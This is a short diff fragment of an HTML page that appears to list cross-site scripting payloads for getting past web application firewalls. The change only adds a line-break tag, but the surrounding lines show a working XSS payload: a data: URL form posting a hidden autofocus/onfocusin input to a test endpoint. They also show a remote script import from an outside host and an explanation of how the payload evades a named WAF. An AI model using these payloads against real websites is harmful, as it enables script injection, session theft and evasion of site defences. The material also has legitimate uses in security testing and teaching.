@@ -45,7 +45,7 @@ import('//X55.is/wp')<br />
 
 data:text/html,&lt;form action=https://brutelogic.com.br/xss-waf.php method=post&gt;&lt<br >
 ;input type=hidden name=a value="<K Contenteditable Autofocus OnFocusIn= [1].map(alert)>"&gt<br >
-&lt;input type=submit value=XSS&gt;&lt/form&gt;
+&lt;input type=submit value=XSS&gt;&lt/form&gt;<br >
 <b>Explanation:</b> This example uses a hidden input field with a crafted payload to bypass the Securi WAF. The Contenteditable attribute allows for user interaction, while Autofocus and OnFocusIn trigger the attack when the form is submitted. Web Application Firewalls typically inspect requests for known patterns, but this creative form submission method can evade such detection mechanisms.
 <br >
 <h3>7. Impera WAF Bypass</h3>
